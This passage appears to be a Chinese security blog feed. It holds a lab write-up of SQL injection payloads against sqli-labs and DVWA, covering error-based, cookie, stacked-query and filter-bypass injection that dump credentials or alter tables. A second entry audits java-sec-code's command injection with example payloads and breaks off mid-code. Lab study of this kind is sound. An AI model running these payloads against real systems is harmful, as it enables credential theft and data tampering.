new_value)<br>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p><h4 id="extractvalue‌函数的基本语法："><a href="#extractvalue‌函数的基本语法：" class="headerlink" title="extractvalue‌函数的基本语法："></a>extractvalue‌函数的基本语法：</h4><p>extractvalue(xml_frag, xpath_expr)<br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>用于返回小于或等于一个给定数字的最大整数。在SQL注入中，利用 floor() 函数可以构造报错注入。它通常和 group by 以及 count(*) 等函数一起使用来触发数据库报错，从而获取敏感信息。</p><p>报错语句</p><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(id,0x7e,username,0x3a,password) from security.users))) #</p><pre><code>使用substring截断?id=1&#39; and extractvalue(1,concat(0x7e, (select substring((select group_concat(id,0x7e,flag) from ctf.flags),1,1000) )))--+</code></pre><h3 id="1、updatexml-payload示例"><a href="#1、updatexml-payload示例" class="headerlink" title="1、updatexml payload示例"></a>1、updatexml payload示例</h3><p>1、爆数据库版本信息<br>k’ and updatexml(1,concat(0x7e,(select version()),0x7e),1)%23<br>k写啥都可以，0x7e是16进制，表示字符‘~’。<br>selecty<br>2、爆数据库当前用户<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select user()),0x7e),1)–+</p><p>3、爆数据库</p><ul><li>所有<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1)–+</li><li>当前<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</li></ul><p>4、爆表<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e),1)–+<br>更改limit后面的数字limit 0完成表名遍历(即在查询网址上面修改来一个一个查看）。</p><p>使用group_concat(table_name)一次性查询出所有的表名<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)–+</p><p>5、获取users表的字段名<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),0x7e),1)–+</p><p>6、获取users表的内容<br>id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)–+</p><h3 id="2、extractvalue-payload"><a href="#2、extractvalue-payload" class="headerlink" title="2、extractvalue payload"></a>2、extractvalue payload</h3><p>payload<br>1’ and extractvalue(1,concat(0x7e,user(),0x7e,database())) #</p><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) #</p><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))) #</p><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #</p><h3 id="3、floor函数"><a href="#3、floor函数" class="headerlink" title="3、floor函数"></a>3、floor函数</h3><p>判断是否存在报错注入<br>id&#x3D;1’ union select #添加count(<em>)可以增加列数 count(</em>),floor(rand(0)*2) x from information_schema.schemata group by x#</p><p>爆出当前数据库名<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #</p><p>爆出表<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1)) x from information_schema.schemata group by x#</p><p>爆出字段名<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’dvwa’ limit 0,1)) x from information_schema.schemata group by x#</p><p>爆出user和password<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(user,0x3a,password) from dvwa.users limit 0,1)) x from information_schema.schemata group by x#</p><h3 id="严格过滤"><a href="#严格过滤" class="headerlink" title="严格过滤"></a>严格过滤</h3><p>逻辑运算符，注释符以及空格<br>?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;’security’))),1))||’0   爆表</p><p>?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema&#x3D;’security’aandnd(table_name&#x3D;’users’)))),1))||’0     爆字段</p><p>?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||’0   爆密码账户</p><h2 id="三、其余注入"><a href="#三、其余注入" class="headerlink" title="三、其余注入"></a>三、其余注入</h2><h3 id="1、加解密注入"><a href="#1、加解密注入" class="headerlink" title="1、加解密注入"></a>1、加解密注入</h3><p>抓取cookie数据包</p><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">GET /Less</span><span style="color: #D19A66">-21</span><span style="color: #ABB2BF">/index.php HTTP/</span><span style="color: #D19A66">1.1</span></span><span class="line"><span style="color: #ABB2BF">Host: </span><span style="color: #D19A66">10.1</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">1.133</span></span><span class="line"><span style="color: #ABB2BF">User-Agent: Mozilla/</span><span style="color: #D19A66">5.0</span><span style="color: #ABB2BF"> (Windows NT </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; Win</span><span style="color: #D19A66">64</span><span style="color: #ABB2BF">; x</span><span style="color: #D19A66">64</span><span style="color: #ABB2BF">; rv:</span><span style="color: #D19A66">83.0</span><span style="color: #ABB2BF">) Gecko/</span><span style="color: #D19A66">20100101</span><span style="color: #ABB2BF"> Firefox/</span><span style="color: #D19A66">83.0</span></span><span class="line"><span style="color: #ABB2BF">Accept: text/html,application/xhtml+xml,application/xml;q=</span><span style="color: #D19A66">0.9</span><span style="color: #ABB2BF">,image/webp,*</span><span style="color: #7F848E; font-style: italic">/*;q=0.8</span></span><span class="line"><span style="color: #7F848E; font-style: italic">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="line"><span style="color: #7F848E; font-style: italic">Accept-Encoding: gzip, deflate</span></span><span class="line"><span style="color: #7F848E; font-style: italic">Referer: http://10.1.1.133/Less-21/index.php</span></span><span class="line"><span style="color: #7F848E; font-style: italic">Connection: close</span></span><span class="line"><span style="color: #7F848E; font-style: italic">Cookie: uname=YWRtaW4%3D</span></span><span class="line"><span style="color: #7F848E; font-style: italic">Upgrade-Insecure-Requests: 1</span></span></code></pre></div></div></figure><p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文</p><p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器</p><p>也就是说admin’ and 1&#x3D;1加密之后的值是YWRtaW4nIGFuZCAxPTE&#x3D;</p><p>获取数据库名称admin’ or updatexml(1,concat(0x7e,(database())),0) or ‘加密后cookie值Cookie: uname&#x3D;YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo&#x3D;</p><h3 id="2、二次注入"><a href="#2、二次注入" class="headerlink" title="2、二次注入"></a>2、二次注入</h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。</p><p>最后我们看到的是将admin的账户密码修改为了123456而admin’#并没有发生改变，原因是代码执行的过程中将’#没有过滤直接带入执行导致’与前面的代码闭合而#将后面的代码给注释。</p><h3 id="3、dnslog注入"><a href="#3、dnslog注入" class="headerlink" title="3、dnslog注入"></a>3、dnslog注入</h3><p>涉及资源：<a href="http://ceye.io/">http://ceye.io</a></p><p>参考资料：<a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p><p>使用DnsLog盲注仅限于windos环境。</p><h3 id="4、中转注入"><a href="#4、中转注入" class="headerlink" title="4、中转注入"></a>4、中转注入</h3><p>中转一个网站，利用网站进行数据集中改变</p><h3 id="5、堆叠查询注入"><a href="#5、堆叠查询注入" class="headerlink" title="5、堆叠查询注入"></a>5、堆叠查询注入</h3><p>stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。<br>简单payload</p><p><a href="http://10.1.1.133/Less-38/index.php?id=1">http://10.1.1.133/Less-38/index.php?id=1</a> ‘;insert into users(id,username,password) values ( 39, ‘less38 ‘, ‘hello ‘)–+<br>查询数据库</p><p>1’;show databases;–+<br>查表</p><p>?inject&#x3D;1’;show tables–+<br>查列</p><p>1’; show columns from <code>words</code>– q<br>修改操作</p><p>1’;rename table words to word2;rename table <code>1919810931114514</code> to words;ALTER TABLE words ADD id int(10) DEFAULT ‘12’;ALTER TABLE  words CHANGE flag data VARCHAR(100);– q</p>]]></content>
    
    
    <categories>
      
      <category>靶场题解</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场题解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-sec-code-master搭建&amp;&amp;审计</title>
    <link href="/2025/10/27/java-sec-code-master%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/java-sec-code-master%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="java-sec-code-master搭建"><a href="#java-sec-code-master搭建" class="headerlink" title="java-sec-code-master搭建"></a>java-sec-code-master搭建</h1><h2 id="源码地址："><a href="#源码地址：" class="headerlink" title="源码地址："></a>源码地址：</h2><p><a href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p><h2 id="搭建环境："><a href="#搭建环境：" class="headerlink" title="搭建环境："></a>搭建环境：</h2><p>IDEA</p><p>apache-maven-3.9.1</p><p>apache-tomcat-9.0.105</p><p>JDK 1.8</p><p>MySQL 5.7.26</p><p>数据库：小皮面板自带的MySQL，导入sql文件</p><ol><li><p>在项目结构里面，然后填上你的jdk1.8的bin目录</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193038076.png" alt="image-20250827162302231"></p></li><li><p>直接创建数据库</p><p>我使用的是phpstudy</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193041520.png" alt="image-20250827162426689"></p></li><li><p>然后把 <code>create_db.sql</code>文件的连接数据库的好密码改为自己的</p><p>（记得到导入数据库配置文件    <code>create_db.sql</code>）</p></li><li><p>然后配置一下tomcat</p><p>去官网下载tomcat，解压出来就是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193044839.png" alt="image-20250827162630334"></p></li><li><p>然后在设置里的这个地方添加这个 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193049362.png" alt="image-20250827162731912"></p></li><li><p>maven使用IDEA自带就行</p><p>（也可以自己下载）</p><p>和之前一样，使用 IDEA 打开项目，执行 <code>mvn clean install</code>，然后运行主类即可启动。</p><p>运行application.java（成功后会显示这个）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193055028.png" alt="image-20250827163223030"></p></li><li><p>运行成功之后，下次直接使用这个就可以启动啦</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193059050.png" alt="image-20250827163153762"></p></li><li><p>直接登录就好了</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027193154913.png" alt="image-20250827163341209"></p></li></ol><h1 id="java-sec-code-master审计"><a href="#java-sec-code-master审计" class="headerlink" title="java-sec-code-master审计"></a>java-sec-code-master审计</h1><p>使用IDEA搭建了java-sec-code-master</p><p>（使用时，要打开phpstudy运行mysql）</p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>src\main\java\org\joychou\controller\CommandInject.java</p><ol><li><p>存在三个方法</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/codeinject&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/codeinject/host&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/codeinject/sec&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//codeinject/sec是安全方法（其它两个存在漏洞）</span></span></code></pre></div></div></figure></li><li><ul><li><p>&#x2F;codeInject</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/codeinject&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">codeInject</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> filepath) throws IOException {</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//String[] cmdList = new String[]{&quot;cmd&quot;, &quot;-c&quot;, &quot;dir -la &quot; + filepath};</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] cmdList </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;cmd.exe&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/c&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;dir  &quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> filepath}</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ProcessBuilder</span><span style="color: #E06C75"> builder </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ProcessBuilder</span><span style="color: #E06C75">(cmdList)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">builder</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">redirectErrorStream</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Process</span><span style="color: #E06C75"> process </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">builder</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">start</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">WebUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">convertStreamToString</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">process</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>filepath并未做任何的过滤，直接拼接</p><p>在windows中<strong>使用&amp;符号拼接cmd命令</strong></p><p>由于是web服务应用，<strong>使用&amp;符号拼接url命令</strong></p></li><li><p>payload</p><p>localhost:9000&#x2F;codeinject?filepath&#x3D;.%26ipconfig</p><p>（页面返回主机配置）</p></li></ul></li><li><ul><li><p>&#x2F;codeinject&#x2F;host</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/codeinject/host&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">codeInjectHost</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #E06C75"> request) throws IOException {</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> host </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getHeader</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;host&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">info</span><span style="color: #ABB2BF">(host);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//String[] cmdList = new String[]{&quot;cmd&quot;, &quot;-c&quot;, &quot;curl &quot; + host};</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] cmdList </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;cmd.exe&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/c&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;dir  &quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> host}</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ProcessBuilder</span><span style="color: #E06C75"> builder </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ProcessBuilder</span><span style="color: #E06C75">(cmdList)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">builder</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">redirectErrorStream</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Process</span><span style="color: #E06C75"> process </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">builder</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">start</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">WebUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">convertStreamToString</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">process</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>http的请求头host（无过滤）</p></li><li><p>payload</p><p>抓包之后，在数据包中修改   <code>host：localhost&amp;ipconfig</code></p><p>(返回包显示主机信息)</p></li></ul></li><li><ul><li><p>codeinject&#x2F;sec（不行）</p><p>原因：（存在过滤）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75"> </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/codeinject/sec&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">codeInjectSec</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> filepath) throws IOException {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> filterFilePath </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">SecurityUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">cmdFilter</span><span style="color: #ABB2BF">(filepath);</span><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">//过滤</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> filterFilePath) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;Bad boy. I got u.&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//String[] cmdList = new String[]{&quot;cmd&quot;, &quot;-c&quot;, &quot;dir -la &quot; + filterFilePath};</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] cmdList </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;cmd.exe&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/c&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;dir  &quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> filterFilePath}</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ProcessBuilder</span><span style="color: #E06C75"> builder </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ProcessBuilder</span><span style="color: #E06C75">(cmdList)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">builder</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">redirectErrorStream</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Process</span><span style="color: #E06C75"> process </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">builder</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">start</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">WebUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">convertStreamToString</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">process</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>追踪<code>cmdFilter</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> string </span><span style="color: #61AFEF">cmdFilter</span><span style="color: #E06C75">(string input){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75">(</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">FILTER</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">PATTERN</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">matcher</span><span style="color: #ABB2BF">(input).</span><span style="color: #61AFEF">matches</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">){</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #C678DD">return</span><span style="color: #E06C75"> input</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>查看FILTER PATTERN（常量）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Pattern</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FILTER</span><span style="color: #E06C75"> PATTERN </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Pattern</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">compile</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;^[a-zA-Z0-9 /</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">.-]+$&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>FILTER PATTERN过滤（大小写，特殊字符）</p><p>出现命令注入时，有特殊字符返回null</p></li><li><p>所以不行</p></li></ul></li></ol><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>\src\main\java\org\joychou\controller\Rce.java</p><p>（已经展示了命令执行过程）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Slf4j</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RestController</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/rce&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Rce</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: 